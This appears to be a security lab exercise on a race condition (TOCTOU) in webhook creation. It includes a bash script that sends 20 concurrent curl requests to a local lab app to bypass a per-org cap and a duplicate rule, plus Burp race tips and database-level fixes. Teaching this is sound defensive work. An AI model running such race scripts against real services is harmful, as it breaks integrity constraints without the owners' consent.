# Lab 02 — Webhook Creation Race Condition (TOCTOU)

**Mirrors:** Report 2 — *Race Condition Allows Bypassing Webhook Creation Constraints for Duplicate Event Types and URLs*
**Class:** Race condition / TOCTOU · **Severity:** Medium

## The story

The app enforces two business rules on webhooks: max 5 per org, and no duplicate
event-type subscriptions. Both are checked with a read, then a write, with an
async gap in between and **no lock**. Fire many identical requests at once and
they all pass the check before any of them writes — the constraint evaporates.

## Recon first (BundleBleed)

Hidden create endpoint mined from the bundle:

```
POST /api-internal/webhooks?organizationId=<ORG>
```

## Reproduce

1. Log in as `owner@acme.test`, grab your `SESSIONID` cookie and `csrfToken`
   (from the `/auth/me` response or DevTools).
2. Save `race.sh`:

```bash
#!/usr/bin/env bash
COOKIE="SESSIONID=<your-session>"
URL="http://localhost:4000/api-internal/webhooks?organizationId=org_ACME0001"
BODY='{"name":"Web 3","url":"https://abc.example.com/hook","eventTypes":"payment-link.paid"}'
for i in $(seq 1 20); do
  curl -s -X POST "$URL" -H "$COOKIE" -H "Content-Type: application/json" -d "$BODY" &
done
wait
```

3. Run it, then `GET /api-internal/webhooks?organizationId=org_ACME0001`.
4. **Result:** multiple webhooks now exist with the **same** URL and the **same**
   `payment-link.paid` event type — the duplicate rule and the max-5 cap are both
   bypassed.

> In Burp: send the create request to **Intruder → null payloads → 20 requests**,
> or use the **Turbo Intruder** "race single-endpoint" template (single-packet
> attack) for a tighter window.

## Why it matters

Duplicate/flooded webhook subscriptions → duplicate event delivery, downstream
consumer confusion, and a broken invariant the rest of the system relies on.

## The fix

Make check-and-insert atomic: a per-org mutex, a DB unique constraint on
`(orgId, eventType)`, or `SELECT ... FOR UPDATE`.
